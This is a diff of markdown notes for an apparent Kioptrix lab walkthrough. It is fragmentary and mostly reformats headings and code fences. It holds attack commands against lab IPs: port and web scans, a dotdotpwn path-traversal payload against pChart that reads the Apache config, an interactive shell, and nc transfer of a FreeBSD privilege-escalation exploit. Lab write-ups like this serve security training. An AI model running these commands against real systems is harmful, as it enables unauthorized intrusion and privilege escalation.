@@ -1,16 +1,17 @@
 ####Reconnaissance
+```
 netdiscover -i eth1
 nmap -p1-65535 -sV -sS -T4 -A (KIOPTRIX IP)
 nikto -h (KIOPTRIX IP)
 dirb http://192.168.23.133
-
-searchsploit pChart
+```
+**searchsploit pChart
 ```shell
 dotdotpwn -m http-url -u http://192.168.139.143/pChart2.1.3/examples/index.php?Action=View\&Script=/TRAVERSAL -k "root:" -o unix
 Apply:
 http://192.168.139.143/pChart2.1.3/examples/index.php?Action=View&Script=/../usr/local/etc/apache22/httpd.conf
 ```
-Update Firefox:
+**Update Firefox:
 ```
 about:config
 general.useragent.override
@@ -34,7 +35,8 @@ run
 
 /bin/sh -i
 ```
-**searchsploit FreeBSD 9 Privilege Escalation
+
+**searchsploit FreeBSD 9 Privilege Escalation  
 ```shell
 nc -nvp 4444 < /usr/share/exploitdb/platforms/freebsd/local/28718.c
 
